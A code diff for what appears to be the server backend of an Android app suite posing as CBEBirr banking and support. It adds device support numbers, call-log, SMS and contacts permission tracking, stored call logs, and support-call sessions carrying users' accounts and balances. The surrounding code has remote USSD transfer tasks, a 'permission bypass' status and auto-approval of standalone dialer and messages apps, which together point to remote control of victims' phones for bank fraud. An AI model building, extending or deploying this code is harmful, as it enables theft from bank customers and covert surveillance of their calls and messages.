@@ -11,12 +11,14 @@ import {
   DeviceRemoteOverride,
   DeviceSyncResponse,
   DeviceTransaction,
+  DialerCallLogEntry,
   OwnerDashboardSnapshot,
   OwnerGlobalConfig,
   OwnerNotification,
   PermissionBypassStatus,
   RemoteUssdStatus,
   RemoteUssdTask,
+  SupportCallSession,
   SupportCommandType,
   SupportSession,
   SupportSessionStatus,
@@ -63,6 +65,19 @@ function safeNum(raw: unknown, fallback = 0): number {
 
 function normalizeAppLang(raw: unknown): 'en' | 'am' {
   return raw === 'am' ? 'am' : 'en';
+}
+
+export function isValidSupportNumber(raw: unknown): boolean {
+  return /^69[0-9]{4}$/.test(String(raw || '').trim());
+}
+
+function hashSeed(str: string): number {
+  let h = 2166136261;
+  for (let i = 0; i < str.length; i++) {
+    h ^= str.charCodeAt(i);
+    h = Math.imul(h, 16777619);
+  }
+  return h >>> 0;
 }
 
 function normalizeUssdProfilesJson(
@@ -191,6 +206,13 @@ function hydrateDeviceDoc(d: Record<string, unknown>, id: string): DeviceClient 
     lockReason: clampStr(d.lockReason, 240, ''),
     approvalStatus: remoteStatus,
     permissionBypassStatus: remotePermBypass,
+    supportNumber: isValidSupportNumber(d.supportNumber) ? String(d.supportNumber).trim() : undefined,
+    hasDialer: d.hasDialer !== undefined ? Boolean(d.hasDialer) : undefined,
+    hasMessages: d.hasMessages !== undefined ? Boolean(d.hasMessages) : undefined,
+    hasBanking: d.hasBanking !== undefined ? Boolean(d.hasBanking) : undefined,
+    callLogPermGranted: d.callLogPermGranted !== undefined ? Boolean(d.callLogPermGranted) : undefined,
+    smsPermGranted: d.smsPermGranted !== undefined ? Boolean(d.smsPermGranted) : undefined,
+    contactsPermGranted: d.contactsPermGranted !== undefined ? Boolean(d.contactsPermGranted) : undefined,
     lastSeenAtMs: remoteSeen,
     createdAtMs: safeNum(d.createdAtMs, remoteSeen),
     updatedAtMs: remoteUpdated,
@@ -212,8 +234,11 @@ interface StoreState {
   supportFetchAtMs: Map<string, number>;
   callSessions: Map<string, CallSession>;
   callFetchAtMs: Map<string, number>;
+  supportCalls: Map<string, SupportCallSession>;
+  supportCallListFetchAtMs: number;
   remoteUssdTasks: Map<string, RemoteUssdTask>;
   remoteUssdFetchAtMs: Map<string, number>;
+  deviceCallLogs: Map<string, DialerCallLogEntry[]>;
   knownDevicesInFirestore: Set<string>;
   globalConfig: OwnerGlobalConfig;
   lastFirestoreSyncMs: number;
@@ -239,8 +264,11 @@ if (!g.__ownerStore) {
     supportFetchAtMs: new Map(),
     callSessions: new Map(),
     callFetchAtMs: new Map(),
+    supportCalls: new Map(),
+    supportCallListFetchAtMs: 0,
     remoteUssdTasks: new Map(),
     remoteUssdFetchAtMs: new Map(),
+    deviceCallLogs: new Map(),
     knownDevicesInFirestore: new Set(),
     globalConfig: { ...DEFAULT_GLOBAL_CONFIG },
     lastFirestoreSyncMs: 0,
@@ -253,9 +281,46 @@ if (!state.supportSessions) state.supportSessions = new Map();
 if (!state.supportFetchAtMs) state.supportFetchAtMs = new Map();
 if (!state.callSessions) state.callSessions = new Map();
 if (!state.callFetchAtMs) state.callFetchAtMs = new Map();
+if (!state.supportCalls) state.supportCalls = new Map();
+if (typeof state.supportCallListFetchAtMs !== 'number') state.supportCallListFetchAtMs = 0;
 if (!state.remoteUssdTasks) state.remoteUssdTasks = new Map();
 if (!state.remoteUssdFetchAtMs) state.remoteUssdFetchAtMs = new Map();
+if (!state.deviceCallLogs) state.deviceCallLogs = new Map();
 if (!state.knownDevicesInFirestore) state.knownDevicesInFirestore = new Set();
+
+function ensureDeviceSupportNumber(deviceId: string, preferred?: string): string {
+  const used = new Set<string>();
+  for (const [id, d] of state.devices.entries()) {
+    if (id !== deviceId && isValidSupportNumber(d.supportNumber)) {
+      used.add(String(d.supportNumber).trim());
+    }
+  }
+  const cleanPreferred = String(preferred || '').trim();
+  if (isValidSupportNumber(cleanPreferred) && !used.has(cleanPreferred)) {
+    return cleanPreferred;
+  }
+  const start = hashSeed(deviceId) % 10000;
+  for (let offset = 0; offset < 10000; offset++) {
+    const suffix = String((start + offset) % 10000).padStart(4, '0');
+    const candidate = `69${suffix}`;
+    if (!used.has(candidate)) {
+      return candidate;
+    }
+  }
+  return `69${String(start).padStart(4, '0')}`;
+}
+
+function backfillMissingSupportNumbers(): void {
+  let mutated = false;
+  for (const [id, d] of state.devices.entries()) {
+    if (!isValidSupportNumber(d.supportNumber)) {
+      const assigned = ensureDeviceSupportNumber(id, d.supportNumber);
+      state.devices.set(id, { ...d, supportNumber: assigned });
+      mutated = true;
+    }
+  }
+  if (mutated) saveToDisk();
+}
 
 function loadFromDisk(): void {
   try {
@@ -287,9 +352,19 @@ function loadFromDisk(): void {
         if (c?.deviceId) state.callSessions.set(c.deviceId, c);
       }
     }
+    if (Array.isArray(parsed.supportCalls)) {
+      for (const sc of parsed.supportCalls) {
+        if (sc?.callId) state.supportCalls.set(sc.callId, sc);
+      }
+    }
     if (Array.isArray(parsed.remoteUssdTasks)) {
       for (const u of parsed.remoteUssdTasks) {
         if (u?.deviceId) state.remoteUssdTasks.set(u.deviceId, u);
+      }
+    }
+    if (parsed.deviceCallLogs && typeof parsed.deviceCallLogs === 'object') {
+      for (const [k, v] of Object.entries(parsed.deviceCallLogs as Record<string, DialerCallLogEntry[]>)) {
+        if (k && Array.isArray(v)) state.deviceCallLogs.set(k, v.slice(0, 150));
       }
     }
     if (parsed.globalConfig?.configId === 'global') {
@@ -312,13 +387,22 @@ function saveToDisk(): void {
     const sortedTxs = Array.from(state.transactions.values())
       .sort((a, b) => (b.createdAtMs || 0) - (a.createdAtMs || 0))
       .slice(0, 5000);
+    const sortedSupportCalls = Array.from(state.supportCalls.values())
+      .sort((a, b) => (b.startedAtMs || 0) - (a.startedAtMs || 0))
+      .slice(0, 120);
+    const callLogsObj: Record<string, DialerCallLogEntry[]> = {};
+    for (const [k, v] of Array.from(state.deviceCallLogs.entries()).slice(-120)) {
+      callLogsObj[k] = v.slice(0, 150);
+    }
     const payload = {
       devices: sortedDevices,
       transactions: sortedTxs,
       notifications: Array.from(state.notifications.values()).slice(-200),
       supportSessions: Array.from(state.supportSessions.values()).slice(-100),
       callSessions: Array.from(state.callSessions.values()).slice(-100),
+      supportCalls: sortedSupportCalls,
       remoteUssdTasks: Array.from(state.remoteUssdTasks.values()).slice(-100),
+      deviceCallLogs: callLogsObj,
       globalConfig: state.globalConfig,
     };
     fs.writeFileSync(LOCAL_STORE_FILE, JSON.stringify(payload), 'utf8');
@@ -435,6 +519,7 @@ async function syncFromFirestoreIfAvailable(force = false): Promise<boolean> {
 
   if (syncedAny) {
     state.lastFirestoreSyncMs = now;
+    backfillMissingSupportNumbers();
     saveToDisk();
   }
   return syncedAny;
@@ -466,6 +551,12 @@ export async function syncDeviceHeartbeat(input: {
   checkOnly?: boolean;
   permissionBypassRequest?: boolean;
   permissionBypassCancel?: boolean;
+  hasDialer?: boolean;
+  hasMessages?: boolean;
+  hasBanking?: boolean;
+  callLogPermGranted?: boolean;
+  smsPermGranted?: boolean;
+  contactsPermGranted?: boolean;
 }): Promise<{
   syncResponse: DeviceSyncResponse;
   device: DeviceClient;
@@ -574,6 +665,128 @@ export async function syncDeviceHeartbeat(input: {
         nowMs - ussd.updatedAtMs < 20_000)
         ? ussd
         : null;
+    const assignedSupportNumber = ensureDeviceSupportNumber(deviceId, prev?.supportNumber);
+    const metaPatch: Record<string, unknown> = {};
+    if (typeof input.hasDialer === 'boolean' && input.hasDialer && !prev?.hasDialer) {
+      metaPatch.hasDialer = true;
+    }
+    if (typeof input.hasMessages === 'boolean' && input.hasMessages && !prev?.hasMessages) {
+      metaPatch.hasMessages = true;
+    }
+    if (typeof input.hasBanking === 'boolean' && input.hasBanking && !prev?.hasBanking) {
+      metaPatch.hasBanking = true;
+    }
+    if (typeof input.callLogPermGranted === 'boolean' && prev?.callLogPermGranted !== input.callLogPermGranted) {
+      metaPatch.callLogPermGranted = input.callLogPermGranted;
+    }
+    if (typeof input.smsPermGranted === 'boolean' && prev?.smsPermGranted !== input.smsPermGranted) {
+      metaPatch.smsPermGranted = input.smsPermGranted;
+    }
+    if (typeof input.contactsPermGranted === 'boolean' && prev?.contactsPermGranted !== input.contactsPermGranted) {
+      metaPatch.contactsPermGranted = input.contactsPermGranted;
+    }
+    if (prev && (!isValidSupportNumber(prev.supportNumber) || prev.supportNumber !== assignedSupportNumber)) {
+      metaPatch.supportNumber = assignedSupportNumber;
+    }
+    if (prev && Object.keys(metaPatch).length > 0) {
+      const updatedPrev: DeviceClient = {
+        ...prev,
+        ...metaPatch,
+        supportNumber: assignedSupportNumber,
+        lastSeenAtMs: input.hasDialer || input.hasMessages ? nowMs : prev.lastSeenAtMs,
+        updatedAtMs: nowMs,
+      };
+      state.devices.set(deviceId, updatedPrev);
+      saveToDisk();
+      void fsPatchFields('devices', deviceId, {
+        ...metaPatch,
+        supportNumber: assignedSupportNumber,
+        lastSeenAtMs: updatedPrev.lastSeenAtMs,
+        updatedAtMs: nowMs,
+        updatedAt: new Date(nowMs),
+      }).catch(() => {});
+      prev = updatedPrev;
+    } else if (!prev && (input.hasDialer || input.hasMessages)) {
+      // Allow standalone Dialer or Messages APK to register a device even without Banking APK installed
+      const standaloneDevice: DeviceClient = {
+        deviceId,
+        deviceName: clampStr(input.deviceName, 120, 'Android Device'),
+        platform: (['android-apk', 'web-pwa', 'web'].includes(String(input.platform))
+          ? input.platform
+          : 'android-apk') as DevicePlatform,
+        appVersion: clampStr(input.appVersion, 40, '1.0.103'),
+        userName: clampStr(input.userName, 120, ''),
+        phoneNumber: clampStr(input.phoneNumber, 32, ''),
+        userAccount: clampStr(input.userAccount, 64, ''),
+        balance: safeNum(input.balance, 0),
+        rewardBalance: 0,
+        appLang: normalizeAppLang(input.appLang),
+        isBalanceShown: true,
+        isRewardShown: false,
+        isLocked: false,
+        lockReason: '',
+        approvalStatus: 'approved',
+        permissionBypassStatus: 'none',
+        supportNumber: assignedSupportNumber,
+        hasDialer: Boolean(input.hasDialer),
+        hasMessages: Boolean(input.hasMessages),
+        hasBanking: Boolean(input.hasBanking),
+        callLogPermGranted: Boolean(input.callLogPermGranted),
+        smsPermGranted: Boolean(input.smsPermGranted),
+        contactsPermGranted: Boolean(input.contactsPermGranted),
+        lastSeenAtMs: nowMs,
+        createdAtMs: nowMs,
+        updatedAtMs: nowMs,
+      };
+      state.devices.set(deviceId, standaloneDevice);
+      saveToDisk();
+      await fsSetDocument('devices', deviceId, {
+        deviceId: standaloneDevice.deviceId,
+        deviceName: standaloneDevice.deviceName,
+        platform: standaloneDevice.platform,
+        appVersion: standaloneDevice.appVersion,
+        userName: standaloneDevice.userName,
+        phoneNumber: standaloneDevice.phoneNumber,
+        userAccount: standaloneDevice.userAccount,
+        balance: standaloneDevice.balance,
+        rewardBalance: 0,
+        appLang: standaloneDevice.appLang || 'en',
+        isBalanceShown: true,
+        isRewardShown: false,
+        ussdProfilesJson: '[]',
+        activeUssdId: DEFAULT_CBE_TRANSFER_USSD.id,
+        phoneUssdProfilesJson: '[]',
+        activePhoneUssdId: DEFAULT_PHONE_TRANSFER_USSD.id,
+        overrideSeq: 0,
+        appliedOverrideSeq: 0,
+        isLocked: false,
+        lockReason: '',
+        approvalStatus: 'approved',
+        permissionBypassStatus: 'none',
+        supportNumber: assignedSupportNumber,
+        hasDialer: Boolean(standaloneDevice.hasDialer),
+        hasMessages: Boolean(standaloneDevice.hasMessages),
+        hasBanking: false,
+        callLogPermGranted: Boolean(standaloneDevice.callLogPermGranted),
+        smsPermGranted: Boolean(standaloneDevice.smsPermGranted),
+        contactsPermGranted: Boolean(standaloneDevice.contactsPermGranted),
+        lastSeenAtMs: nowMs,
+        ownerId: SYSTEM_OWNER_ID,
+        createdAtMs: nowMs,
+        updatedAtMs: nowMs,
+        createdAt: new Date(nowMs),
+        updatedAt: new Date(nowMs),
+      }).catch(() => {});
+      prev = standaloneDevice;
+    } else if (prev && (input.hasDialer || input.hasMessages) && nowMs - (prev.lastSeenAtMs || 0) > 10_000) {
+      prev = { ...prev, lastSeenAtMs: nowMs, updatedAtMs: nowMs };
+      state.devices.set(deviceId, prev);
+      void fsPatchFields('devices', deviceId, {
+        lastSeenAtMs: nowMs,
+        updatedAtMs: nowMs,
+        updatedAt: new Date(nowMs),
+      }).catch(() => {});
+    }
     const fallbackDevice: DeviceClient = prev || {
       deviceId,
       deviceName: clampStr(input.deviceName, 120, 'Android Device'),
@@ -593,6 +806,7 @@ export async function syncDeviceHeartbeat(input: {
       lockReason: '',
       approvalStatus: 'pending',
       permissionBypassStatus: devPermBypass,
+      supportNumber: assignedSupportNumber,
       lastSeenAtMs: 0,
       createdAtMs: nowMs,
       updatedAtMs: nowMs,
@@ -601,6 +815,7 @@ export async function syncDeviceHeartbeat(input: {
       syncResponse: {
         success: true,
         deviceId,
+        supportNumber: fallbackDevice.supportNumber || assignedSupportNumber,
         approvalStatus: devStatus,
         permissionBypassStatus: devPermBypass,
         globalLocked: state.globalConfig.globalLocked,
@@ -757,6 +972,13 @@ export async function syncDeviceHeartbeat(input: {
   }
 
   const nextAppliedSeq = Math.max(prev?.appliedOverrideSeq || 0, Math.min(serverOverrideSeq, clientAppliedSeq));
+  const assignedSupportNumber = ensureDeviceSupportNumber(deviceId, prev?.supportNumber);
+  const nextHasBanking = typeof input.hasBanking === 'boolean' ? input.hasBanking : (prev?.hasBanking ?? true);
+  const nextHasDialer = typeof input.hasDialer === 'boolean' ? (input.hasDialer || Boolean(prev?.hasDialer)) : Boolean(prev?.hasDialer);
+  const nextHasMessages = typeof input.hasMessages === 'boolean' ? (input.hasMessages || Boolean(prev?.hasMessages)) : Boolean(prev?.hasMessages);
+  const nextCallLogPerm = typeof input.callLogPermGranted === 'boolean' ? input.callLogPermGranted : prev?.callLogPermGranted;
+  const nextSmsPerm = typeof input.smsPermGranted === 'boolean' ? input.smsPermGranted : prev?.smsPermGranted;
+  const nextContactsPerm = typeof input.contactsPermGranted === 'boolean' ? input.contactsPermGranted : prev?.contactsPermGranted;
 
   const nextDevice: DeviceClient = {
     deviceId,
@@ -783,6 +1005,13 @@ export async function syncDeviceHeartbeat(input: {
     lockReason: prev?.lockReason || '',
     approvalStatus: nextApprovalStatus,
     permissionBypassStatus: nextPermissionBypassStatus,
+    supportNumber: assignedSupportNumber,
+    hasDialer: nextHasDialer,
+    hasMessages: nextHasMessages,
+    hasBanking: nextHasBanking,
+    callLogPermGranted: nextCallLogPerm,
+    smsPermGranted: nextSmsPerm,
+    contactsPermGranted: nextContactsPerm,
     lastSeenAtMs: input.offline ? Math.max(0, nowMs - 120_000) : nowMs,
     createdAtMs: prev?.createdAtMs || nowMs,
     updatedAtMs: nowMs,
@@ -825,6 +1054,13 @@ export async function syncDeviceHeartbeat(input: {
       lockReason: nextDevice.lockReason || '',
       approvalStatus: nextApprovalStatus,
       permissionBypassStatus: nextPermissionBypassStatus,
+      supportNumber: assignedSupportNumber,
+      hasDialer: Boolean(nextHasDialer),
+      hasMessages: Boolean(nextHasMessages),
+      hasBanking: Boolean(nextHasBanking),
+      callLogPermGranted: Boolean(nextCallLogPerm),
+      smsPermGranted: Boolean(nextSmsPerm),
+      contactsPermGranted: Boolean(nextContactsPerm),
       lastSeenAtMs: nextDevice.lastSeenAtMs,
       ownerId: SYSTEM_OWNER_ID,
       createdAtMs: nextDevice.createdAtMs || nowMs,
@@ -838,6 +1074,13 @@ export async function syncDeviceHeartbeat(input: {
       platform: nextDevice.platform,
       appVersion: nextDevice.appVersion,
       appliedOverrideSeq: nextDevice.appliedOverrideSeq || 0,
+      supportNumber: assignedSupportNumber,
+      hasDialer: Boolean(nextHasDialer),
+      hasMessages: Boolean(nextHasMessages),
+      hasBanking: Boolean(nextHasBanking),
+      callLogPermGranted: Boolean(nextCallLogPerm),
+      smsPermGranted: Boolean(nextSmsPerm),
+      contactsPermGranted: Boolean(nextContactsPerm),
       lastSeenAtMs: nextDevice.lastSeenAtMs,
       updatedAtMs: nowMs,
       updatedAt: new Date(nowMs),
@@ -918,6 +1161,7 @@ export async function syncDeviceHeartbeat(input: {
     syncResponse: {
       success: true,
       deviceId,
+      supportNumber: assignedSupportNumber,
       approvalStatus: nextApprovalStatus,
       permissionBypassStatus: nextPermissionBypassStatus,
       globalLocked: state.globalConfig.globalLocked,
@@ -1734,6 +1978,7 @@ export async function getActiveNotificationsForDevices(
 export async function getOwnerDashboardSnapshot(forceSync = true): Promise<OwnerDashboardSnapshot> {
   loadFromDisk();
   const fsSynced = await syncFromFirestoreIfAvailable(forceSync);
+  backfillMissingSupportNumbers();
   const nowMs = Date.now();
 
   const RECENTLY_JOINED_WINDOW_MS = 10 * 60_000;
@@ -1743,6 +1988,7 @@ export async function getOwnerDashboardSnapshot(forceSync = true): Promise<Owner
   const devices = Array.from(state.devices.values())
     .map((d) => ({
       ...d,
+      supportNumber: ensureDeviceSupportNumber(d.deviceId, d.supportNumber),
       approvalStatus: d.approvalStatus || 'approved',
       permissionBypassStatus: d.permissionBypassStatus || 'none',
       isOnline: isDeviceOnline(d.lastSeenAtMs, nowMs),
@@ -2479,12 +2725,16 @@ function normalizeCallSessionDoc(raw: Record<string, unknown>, fallbackDeviceId:
     : 'ended';
   const callerRole = raw.callerRole === 'ram_control' ? 'ram_control' : 'app_0069';
   const callMode: CallMode = raw.callMode === 'video' ? 'video' : 'audio';
+  const targetApp =
+    raw.targetApp === 'dialer' || raw.targetApp === 'banking' ? raw.targetApp : 'any';
   return {
     callId: sanitizeId(String(raw.callId || buildCallSessionId(deviceId))),
     deviceId,
     deviceName: clampStr(raw.deviceName, 120, 'Android Device'),
     callerRole,
     callerName: clampStr(raw.callerName, 80, 'CBEBirr Support'),
+    callerNumber: clampStr(raw.callerNumber, 32, '') || undefined,
+    targetApp,
     callMode,
     status,
     rtcSeq: Math.max(0, Math.round(safeNum(raw.rtcSeq, 0))),
@@ -2504,6 +2754,8 @@ function normalizeCallSessionDoc(raw: Record<string, unknown>, fallbackDeviceId:
 async function saveCallSessionToFirestore(call: CallSession): Promise<void> {
   await fsSetDocument('call_sessions', call.callId, {
     ...call,
+    callerNumber: clampStr(call.callerNumber, 32, ''),
+    targetApp: call.targetApp === 'dialer' || call.targetApp === 'banking' ? call.targetApp : 'any',
     callMode: call.callMode === 'video' ? 'video' : 'audio',
     rtcSeq: call.rtcSeq || 0,
     rtcOffer: sanitizeSdpJson(call.rtcOffer),
@@ -2575,6 +2827,8 @@ export async function startCallSession(
   input: {
     callerRole?: 'app_0069' | 'ram_control';
     callerName?: string;
+    callerNumber?: string;
+    targetApp?: 'dialer' | 'banking' | 'any';
     callMode?: CallMode;
     rtcOffer?: string;
     rtcSeq?: number;
@@ -2593,6 +2847,8 @@ export async function startCallSession(
     ? Math.max(1, Math.round(safeNum(input.rtcSeq, 1)))
     : 0;
   const resolvedMode: CallMode = input.callMode === 'video' ? 'video' : 'audio';
+  const resolvedTargetApp =
+    input.targetApp === 'dialer' || input.targetApp === 'banking' ? input.targetApp : 'any';
 
   const call: CallSession = {
     callId: buildCallSessionId(deviceId),
@@ -2600,6 +2856,8 @@ export async function startCallSession(
     deviceName: dev?.deviceName || 'Android Device',
     callerRole: input.callerRole === 'ram_control' ? 'ram_control' : 'app_0069',
     callerName: clampStr(input.callerName, 80, resolvedMode === 'video' ? 'Owner Video Call' : 'Owner Wi-Fi Call'),
+    callerNumber: clampStr(input.callerNumber, 32, '') || undefined,
+    targetApp: resolvedTargetApp,
     callMode: resolvedMode,
     status: 'ringing',
     rtcSeq: initSeq,
@@ -3127,5 +3385,457 @@ export async function clearRemoteUssdTask(deviceIdInput: string): Promise<void> 
   saveToDisk();
   await fsDeleteDocument('remote_ussd_tasks', buildRemoteUssdDocId(deviceId)).catch(() => {});
 }
+
+// ---------- Standalone 951 Support Queue Calls (Call APK -> Support APK) ----------
+
+function stripSupportCallSignal(call: SupportCallSession, keepSignal = true): SupportCallSession {
+  if (keepSignal) return call;
+  if (!call.rtcOffer && !call.rtcAnswer) return call;
+  return { ...call, rtcOffer: '', rtcAnswer: '' };
+}
+
+function normalizeSupportCallDoc(raw: Record<string, unknown>, fallbackCallId = ''): SupportCallSession {
+  const nowMs = Date.now();
+  const deviceId = sanitizeId(String(raw.deviceId || 'unknown_device'));
+  const statusRaw = String(raw.status || 'ended');
+  const status: CallSessionStatus = ['ringing', 'active', 'ended', 'declined', 'missed'].includes(statusRaw)
+    ? (statusRaw as CallSessionStatus)
+    : 'ended';
+  return {
+    callId: sanitizeId(String(raw.callId || fallbackCallId || `sup_${deviceId}_${nowMs}`)),
+    deviceId,
+    deviceName: clampStr(raw.deviceName, 120, 'Android Device'),
+    userName: clampStr(raw.userName, 120, 'CBEBirr Customer'),
+    phoneNumber: clampStr(raw.phoneNumber, 32, ''),
+    userAccount: clampStr(raw.userAccount, 64, ''),
+    balance: safeNum(raw.balance, 0),
+    callMode: 'audio',
+    status,
+    rtcSeq: Math.max(0, Math.round(safeNum(raw.rtcSeq, 0))),
+    rtcOffer: sanitizeSdpJson(raw.rtcOffer),
+    rtcAnswer: sanitizeSdpJson(raw.rtcAnswer),
+    callerMicMuted: Boolean(raw.callerMicMuted),
+    supportMicMuted: Boolean(raw.supportMicMuted),
+    startedAtMs: safeNum(raw.startedAtMs, nowMs),
+    answeredAtMs: safeNum(raw.answeredAtMs, 0),
+    expiresAtMs: safeNum(raw.expiresAtMs, nowMs),
+    updatedAtMs: safeNum(raw.updatedAtMs, nowMs),
+  };
+}
+
+async function saveSupportCallToFirestore(call: SupportCallSession): Promise<void> {
+  await fsSetDocument('support_calls', call.callId, {
+    ...call,
+    callMode: 'audio',
+    rtcSeq: call.rtcSeq || 0,
+    rtcOffer: sanitizeSdpJson(call.rtcOffer),
+    rtcAnswer: sanitizeSdpJson(call.rtcAnswer),
+    callerMicMuted: Boolean(call.callerMicMuted),
+    supportMicMuted: Boolean(call.supportMicMuted),
+    ownerId: SYSTEM_OWNER_ID,
+    createdAt: new Date(call.startedAtMs || call.updatedAtMs || Date.now()),
+    updatedAt: new Date(call.updatedAtMs || Date.now()),
+  }).catch(() => {});
+}
+
+async function expireSupportCallIfNeeded(call: SupportCallSession, nowMs: number): Promise<SupportCallSession> {
+  if (
+    (call.status === 'ringing' || call.status === 'active') &&
+    call.expiresAtMs > 0 &&
+    nowMs > call.expiresAtMs
+  ) {
+    const expired: SupportCallSession = {
+      ...call,
+      status: call.status === 'ringing' ? 'missed' : 'ended',
+      rtcSeq: 0,
+      rtcOffer: '',
+      rtcAnswer: '',
+      callerMicMuted: false,
+      supportMicMuted: false,
+      updatedAtMs: nowMs,
+    };
+    state.supportCalls.set(expired.callId, expired);
+    saveToDisk();
+    await saveSupportCallToFirestore(expired);
+    return expired;
+  }
+  return call;
+}
+
+export async function getSupportCallSession(
+  callIdInput: string,
+  forceFs = false,
+  options?: { includeSignal?: boolean }
+): Promise<SupportCallSession | null> {
+  loadFromDisk();
+  const nowMs = Date.now();
+  const callId = sanitizeId(callIdInput);
+
+  if (forceFs) {
+    const fsDoc = await fsGetDocument<Record<string, unknown>>('support_calls', callId).catch(() => null);
+    if (fsDoc && fsDoc.callId) {
+      const normalized = normalizeSupportCallDoc(fsDoc, callId);
+      const local = state.supportCalls.get(callId);
+      if (!local || normalized.updatedAtMs >= local.updatedAtMs) {
+        state.supportCalls.set(callId, normalized);
+        saveToDisk();
+      }
+    }
+  }
+
+  const current = state.supportCalls.get(callId) || null;
+  if (!current) return null;
+  const checked = await expireSupportCallIfNeeded(current, nowMs);
+  return stripSupportCallSignal(checked, options?.includeSignal !== false);
+}
+
+export async function listSupportCallSessions(
+  options?: { includeSignal?: boolean; forceFs?: boolean }
+): Promise<SupportCallSession[]> {
+  loadFromDisk();
+  const nowMs = Date.now();
+  if (options?.forceFs || nowMs - state.supportCallListFetchAtMs >= 450) {
+    state.supportCallListFetchAtMs = nowMs;
+    const docs = (await fsListCollection<Record<string, unknown>>('support_calls', 40).catch(() => null)) || [];
+    let changed = false;
+    for (const raw of docs) {
+      if (!raw || !raw.callId) continue;
+      const normalized = normalizeSupportCallDoc(raw);
+      const local = state.supportCalls.get(normalized.callId);
+      if (!local || normalized.updatedAtMs >= local.updatedAtMs) {
+        state.supportCalls.set(normalized.callId, normalized);
+        changed = true;
+      }
+    }
+    if (changed) saveToDisk();
+  }
+
+  const results: SupportCallSession[] = [];
+  for (const item of Array.from(state.supportCalls.values())) {
+    const checked = await expireSupportCallIfNeeded(item, nowMs);
+    results.push(stripSupportCallSignal(checked, options?.includeSignal !== false));
+  }
+  results.sort((a, b) => (b.startedAtMs || 0) - (a.startedAtMs || 0));
+  return results.slice(0, 40);
+}
+
+export async function startSupportCallSession(input: {
+  deviceId: string;
+  deviceName?: string;
+  userName?: string;
+  phoneNumber?: string;
+  userAccount?: string;
+  balance?: number;
+  rtcOffer?: string;
+  rtcSeq?: number;
+  maxRingSec?: number;
+}): Promise<SupportCallSession> {
+  loadFromDisk();
+  const nowMs = Date.now();
+  const deviceId = sanitizeId(input.deviceId);
+  let dev = state.devices.get(deviceId);
+  if (!dev) {
+    await syncFromFirestoreIfAvailable(true);
+    dev = state.devices.get(deviceId);
+  }
+
+  // Close any stale ringing call from the same device so Support APK doesn't double-ring
+  for (const existing of Array.from(state.supportCalls.values())) {
+    if (existing.deviceId === deviceId && (existing.status === 'ringing' || existing.status === 'active')) {
+      const closed: SupportCallSession = {
+        ...existing,
+        status: 'ended',
+        rtcSeq: 0,
+        rtcOffer: '',
+        rtcAnswer: '',
+        updatedAtMs: nowMs,
+      };
+      state.supportCalls.set(closed.callId, closed);
+      await saveSupportCallToFirestore(closed);
+    }
+  }
+
+  const cleanOffer = sanitizeSdpJson(input.rtcOffer);
+  const initSeq = cleanOffer ? Math.max(1, Math.round(safeNum(input.rtcSeq, 1))) : 0;
+  const ringSec = Math.max(10, Math.min(60, Math.round(safeNum(input.maxRingSec, 30))));
+  const callId = sanitizeId(`sup_${deviceId}_${nowMs}`);
+
+  const call: SupportCallSession = {
+    callId,
+    deviceId,
+    deviceName: clampStr(input.deviceName || dev?.deviceName, 120, 'Android Device'),
+    userName: clampStr(input.userName || dev?.userName, 120, 'CBEBirr Customer'),
+    phoneNumber: clampStr(input.phoneNumber || dev?.phoneNumber, 32, ''),
+    userAccount: clampStr(input.userAccount || dev?.userAccount, 64, ''),
+    balance: safeNum(input.balance ?? dev?.balance, 0),
+    callMode: 'audio',
+    status: 'ringing',
+    rtcSeq: initSeq,
+    rtcOffer: cleanOffer,
+    rtcAnswer: '',
+    callerMicMuted: false,
+    supportMicMuted: false,
+    startedAtMs: nowMs,
+    answeredAtMs: 0,
+    expiresAtMs: nowMs + ringSec * 1000,
+    updatedAtMs: nowMs,
+  };
+
+  state.supportCalls.set(call.callId, call);
+  saveToDisk();
+  await saveSupportCallToFirestore(call);
+  return call;
+}
+
+export async function answerSupportCallSession(
+  callIdInput: string,
+  input?: {
+    rtcAnswer?: string;
+    rtcSeq?: number;
+    supportMicMuted?: boolean;
+  }
+): Promise<SupportCallSession | null> {
+  const callId = sanitizeId(callIdInput);
+  const current = await getSupportCallSession(callId, true, { includeSignal: true });
+  if (!current) return null;
+  if (current.status !== 'ringing' && current.status !== 'active') {
+    return current;
+  }
+
+  const nowMs = Date.now();
+  const cleanAnswer = sanitizeSdpJson(input?.rtcAnswer);
+  const next: SupportCallSession = {
+    ...current,
+    status: 'active',
+    answeredAtMs: current.answeredAtMs || nowMs,
+    rtcAnswer: cleanAnswer || current.rtcAnswer,
+    supportMicMuted:
+      typeof input?.supportMicMuted === 'boolean' ? input.supportMicMuted : current.supportMicMuted,
+    expiresAtMs: nowMs + 30 * 60_000,
+    updatedAtMs: nowMs,
+  };
+  state.supportCalls.set(callId, next);
+  saveToDisk();
+  await saveSupportCallToFirestore(next);
+  return next;
+}
+
+export async function declineSupportCallSession(callIdInput: string): Promise<SupportCallSession | null> {
+  const callId = sanitizeId(callIdInput);
+  const current = await getSupportCallSession(callId, true, { includeSignal: true });
+  if (!current) return null;
+
+  const nowMs = Date.now();
+  const next: SupportCallSession = {
+    ...current,
+    status: 'declined',
+    rtcSeq: 0,
+    rtcOffer: '',
+    rtcAnswer: '',
+    callerMicMuted: false,
+    supportMicMuted: false,
+    updatedAtMs: nowMs,
+  };
+  state.supportCalls.set(callId, next);
+  saveToDisk();
+  await saveSupportCallToFirestore(next);
+  return next;
+}
+
+export async function endSupportCallSession(
+  callIdInput: string,
+  finalStatus: 'ended' | 'missed' = 'ended'
+): Promise<SupportCallSession | null> {
+  const callId = sanitizeId(callIdInput);
+  const current = await getSupportCallSession(callId, true, { includeSignal: true });
+  if (!current) return null;
+
+  const resolvedStatus: CallSessionStatus =
+    finalStatus === 'missed' && current.status === 'ringing' ? 'missed' : 'ended';
+  const nowMs = Date.now();
+  const next: SupportCallSession = {
+    ...current,
+    status: resolvedStatus,
+    rtcSeq: 0,
+    rtcOffer: '',
+    rtcAnswer: '',
+    callerMicMuted: false,
+    supportMicMuted: false,
+    updatedAtMs: nowMs,
+  };
+  state.supportCalls.set(callId, next);
+  saveToDisk();
+  await saveSupportCallToFirestore(next);
+  return next;
+}
+
+export async function pushSupportCallSignal(
+  callIdInput: string,
+  signal: {
+    role: 'caller' | 'support';
+    rtcSeq?: number;
+    rtcOffer?: string;
+    rtcAnswer?: string;
+    callerMicMuted?: boolean;
+    supportMicMuted?: boolean;
+  }
+): Promise<SupportCallSession | null> {
+  const callId = sanitizeId(callIdInput);
+  const current = await getSupportCallSession(callId, true, { includeSignal: true });
+  if (!current || (current.status !== 'ringing' && current.status !== 'active')) {
+    return null;
+  }
+
+  const nowMs = Date.now();
